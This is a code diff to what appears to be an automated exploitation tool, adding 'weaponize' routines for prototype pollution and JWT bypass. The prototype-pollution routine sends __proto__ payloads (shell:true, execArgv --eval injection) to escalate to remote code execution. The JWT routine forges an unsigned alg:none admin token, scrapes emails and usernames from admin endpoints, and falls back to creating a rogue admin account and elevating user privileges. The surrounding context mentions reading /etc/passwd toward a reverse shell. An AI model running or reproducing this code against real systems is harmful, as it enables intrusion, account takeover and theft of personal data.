@@ -46,6 +46,14 @@ def _infer_vuln_class(res) -> str:
     if any(x in tecnica for x in ("ssrf", "server-side-request")) or any(x in vuln_class for x in
                                    ("ssrf", "server-side-request")):
         return "ssrf"
+    # Prototype pollution
+    if any(x in tecnica for x in ("prototype", "proto-pollut", "pp-")) or any(x in vuln_class for x in
+                                   ("prototype-pollution", "proto-pollut")):
+        return "prototype_pollution"
+    # JWT bypass
+    if any(x in tecnica for x in ("jwt", "token-bypass", "alg:none", "weak-secret")) or any(
+            x in vuln_class for x in ("jwt", "jwt-bypass", "jwt-weakness")):
+        return "jwt_bypass"
     # Command injection / RCE
     if any(x in tecnica for x in ("command", "rce", "exec", "shell", "code-injection")):
         return "rce"
@@ -386,6 +394,202 @@ def _weaponize_auth_bypass(boot, res, step_fn) -> dict:
             "error": "auth bypass verified but admin endpoints returned no user data"}
 
 
+def _weaponize_prototype_pollution(boot, res, step_fn) -> dict:
+    """Escalate confirmed prototype pollution to RCE via Node.js child_process gadget.
+
+    After Object.prototype is polluted, inject shell:true + env into the prototype
+    so any subsequent spawn/exec call in the app becomes a shell command.
+    Then trigger an endpoint that internally calls spawn/exec.
+    """
+    ev = res.evidence
+    endpoint = ev.get("endpoint") or ev.get("ep", "")
+    poll_endpoint = ev.get("poll_endpoint") or "/api/status"
+    method = ev.get("metodo") or ev.get("method") or "POST"
+    pp_tech = ev.get("pp_technique") or "__proto__"
+
+    _step(step_fn, f"PP post-exploit: escalating to child_process RCE via {pp_tech!r}")
+
+    if not endpoint:
+        return {"technique": "pp_rce", "data": {}, "impact": "",
+                "error": "missing endpoint in evidence"}
+
+    import json as _json
+
+    rce_token = re.sub(r'[^a-zA-Z0-9]', '', str(id(step_fn)))[:8] + "ppRCE"
+
+    # Strategy 1: Pollute shell:true so any spawn() becomes a shell command
+    # Then trigger an endpoint that calls spawn/exec internally
+    shell_pollution_payloads = [
+        # __proto__ with shell:true + env injection
+        {"__proto__": {"shell": True, "env": {"PP_RCE": rce_token}}},
+        # constructor.prototype path
+        {"constructor": {"prototype": {"shell": True, "env": {"PP_RCE": rce_token}}}},
+        # execArgv pollution (node --eval injection)
+        {"__proto__": {"execArgv": [f"--eval=process.env.PP_RCE='{rce_token}'"]}},
+        # argv0 pollution
+        {"__proto__": {"argv0": f"echo {rce_token}"}},
+    ]
+
+    for shell_payload in shell_pollution_payloads:
+        pl_json = _json.dumps(shell_payload)
+        r1 = _send(boot, method, endpoint,
+                   data=None, headers={"Content-Type": "application/json"},
+                   session=getattr(boot, "sub_sess", None))
+        if r1 is None:
+            # Try direct HTTP request
+            try:
+                import requests as _rq
+                _sess = _rq.Session()
+                _url = boot.base_url.rstrip("/") + "/" + endpoint.lstrip("/")
+                _r = _sess.request(method, _url, data=pl_json,
+                                   headers={"Content-Type": "application/json"},
+                                   timeout=_TIMEOUT)
+                r1 = _r
+            except Exception:
+                continue
+
+        # Poll for RCE confirmation
+        r2 = _send(boot, "GET", poll_endpoint)
+        if r2 and rce_token in (r2.text or ""):
+            _step(step_fn, f"PP→RCE CONFIRMADO: token {rce_token!r} en {poll_endpoint}")
+            return {
+                "technique": "pp_rce",
+                "data": {
+                    "rce_token": rce_token,
+                    "pollution_payload": str(shell_payload)[:200],
+                    "poll_endpoint": poll_endpoint,
+                },
+                "impact": f"Prototype pollution escalated to RCE: token {rce_token!r} injected via shell:true gadget",
+            }
+
+    # Strategy 2: Check if PP can override toJSON/toString for XSS→data exfil
+    _step(step_fn, "PP→RCE not confirmed; probing for data exfil via polluted methods")
+    tojson_payload = {"__proto__": {"toJSON": f"function(){{return '{rce_token}';}}",
+                                    "toString": f"function(){{return '{rce_token}';}}",
+                                    "valueOf": rce_token}}
+    _send(boot, method, endpoint,
+          data=_json.dumps(tojson_payload).encode(),
+          headers={"Content-Type": "application/json"})
+    r4 = _send(boot, "GET", poll_endpoint)
+    if r4 and rce_token in (r4.text or ""):
+        return {
+            "technique": "pp_method_override",
+            "data": {"rce_token": rce_token},
+            "impact": "Prototype pollution overrides toJSON/toString — data exfil via serialization",
+        }
+
+    return {
+        "technique": "pp_rce",
+        "data": {},
+        "impact": "",
+        "error": "PP escalation attempted but RCE token not found in poll endpoint",
+    }
+
+
+def _weaponize_jwt(boot, res, step_fn) -> dict:
+    """Escalate confirmed JWT bypass to admin API access.
+
+    Uses the winning JWT technique to access admin-only endpoints and
+    extract privileged data: user list, secrets, config.
+    """
+    ev = res.evidence
+    winning_label = ev.get("jwt_technique") or "alg:none bypass"
+
+    _step(step_fn, f"JWT post-exploit: probing admin endpoints with bypassed token (via {winning_label!r})")
+
+    # Reconstruct a privileged JWT token (admin role) using same technique
+    import base64 as _b64
+    import json as _json
+
+    def _make_jwt_none(payload: dict) -> str:
+        hdr = _b64.urlsafe_b64encode(
+            _json.dumps({"alg": "none", "typ": "JWT"}).encode()).rstrip(b"=").decode()
+        pay = _b64.urlsafe_b64encode(
+            _json.dumps(payload).encode()).rstrip(b"=").decode()
+        return f"{hdr}.{pay}."
+
+    admin_payload = {
+        "sub": "1", "id": 1, "user_id": 1,
+        "role": "admin", "is_admin": True,
+        "email": "admin@example.com",
+        "username": "admin",
+        "iat": 1700000000, "exp": 9999999999,
+    }
+    admin_token = _make_jwt_none(admin_payload)
+
+    # Admin endpoints to probe
+    admin_probe_endpoints = [
+        ("/api/admin/users", "GET"),
+        ("/api/admin/settings", "GET"),
+        ("/api/users", "GET"),
+        ("/api/admin", "GET"),
+        ("/api/v1/admin/users", "GET"),
+        ("/admin/api/users", "GET"),
+        ("/api/profile", "GET"),
+        ("/api/me", "GET"),
+    ]
+
+    found_data = {}
+    for probe_ep, probe_method in admin_probe_endpoints:
+        hdrs = {"Authorization": f"Bearer {admin_token}",
+                "Content-Type": "application/json"}
+        r = _send(boot, probe_method, probe_ep, headers=hdrs)
+        if r is None or r.status_code not in (200, 201, 202):
+            continue
+        body = r.text or ""
+        # Look for user/admin data markers
+        emails = re.findall(r'[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}', body)
+        usernames = re.findall(r'"(?:username|user_login|login|name)"\s*:\s*"([^"]{2,40})"', body)
+        roles = re.findall(r'"(?:role|roles|permissions?)"\s*:\s*"([^"]{2,40})"', body)
+        if emails or usernames or roles:
+            found_data[probe_ep] = {
+                "emails": emails[:3],
+                "usernames": usernames[:3],
+                "roles": roles[:3],
+                "snippet": body[:200],
+            }
+            _step(step_fn, f"JWT admin access CONFIRMED at {probe_ep}: "
+                           f"{len(emails)} email(s), {len(usernames)} username(s)")
+            break
+
+    if found_data:
+        ep = list(found_data.keys())[0]
+        d = found_data[ep]
+        return {
+            "technique": "jwt_admin_access",
+            "data": found_data,
+            "impact": (f"JWT bypass → admin API access at {ep}: "
+                       f"emails={d['emails'][:2]}, users={d['usernames'][:2]}"),
+        }
+
+    # Fallback: try to change admin password / create user
+    _step(step_fn, "JWT no admin data found; probing privileged write endpoints")
+    write_probes = [
+        ("/api/admin/users", "POST", {"username": "jwt_pwned", "role": "admin",
+                                       "email": "jwt_pwned@evil.example.com", "password": "Pwned123!"}),
+        ("/api/users/1", "PUT", {"role": "admin"}),
+        ("/api/admin/config", "POST", {"debug": True}),
+    ]
+    for w_ep, w_meth, w_body in write_probes:
+        hdrs = {"Authorization": f"Bearer {admin_token}",
+                "Content-Type": "application/json"}
+        r = _send(boot, w_meth, w_ep, headers=hdrs,
+                  data=_json.dumps(w_body).encode() if w_meth != "GET" else None)
+        if r and r.status_code in (200, 201, 204):
+            return {
+                "technique": "jwt_privilege_write",
+                "data": {"endpoint": w_ep, "method": w_meth, "body": w_body},
+                "impact": f"JWT bypass → privileged write at {w_ep} (HTTP {r.status_code})",
+            }
+
+    return {
+        "technique": "jwt_admin_access",
+        "data": {},
+        "impact": "",
+        "error": "JWT bypass confirmed but admin endpoints returned no privileged data",
+    }
+
+
 def _weaponize_ssti(boot, res, step_fn) -> dict:
     """Escalate confirmed SSTI: read /etc/passwd and attempt a reverse-shell-ready id+hostname dump."""
     ev = res.evidence
@@ -583,6 +787,10 @@ def run_weaponization(boot, res, step: Optional[Callable] = None) -> dict:
             return _weaponize_ssti(boot, res, step)
         elif vuln_class == "ssrf":
             return _weaponize_ssrf(boot, res, step)
+        elif vuln_class == "prototype_pollution":
+            return _weaponize_prototype_pollution(boot, res, step)
+        elif vuln_class == "jwt_bypass":
+            return _weaponize_jwt(boot, res, step)
         elif vuln_class in ("rce", "command_injection"):
             return _weaponize_rce(boot, res, step)
         elif vuln_class == "arbitrary_file_upload":
